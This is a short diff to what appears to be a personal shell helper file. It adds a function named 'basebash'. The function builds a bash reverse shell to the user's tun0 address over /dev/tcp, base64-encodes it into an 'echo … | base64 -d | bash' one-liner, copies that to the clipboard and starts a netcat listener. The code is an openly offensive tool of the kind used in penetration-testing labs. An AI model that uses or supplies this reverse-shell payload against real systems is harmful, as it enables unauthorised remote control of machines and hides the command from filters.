@@ -69,3 +69,12 @@ urlencode() {
 urldecode() {
     python3 -c "import sys, urllib.parse as ul; print(ul.unquote_plus(sys.argv[1]))" "$1"
 }
+
+basebash() {
+   IP=$(ip -f inet addr show tun0 | sed -En -e 's/.*inet ([0-9.]+).*/\1/p')
+   rev="/bin/bash -i >& /dev/tcp/$IP/$1 0>&1"
+   brev=$(echo -n "$rev" | base64)
+   echo "echo $brev | base64 -d | bash" | xclip -selection clipboard
+   xclip -out -selection clipboard
+   sudo nc -nlvp $1
+}
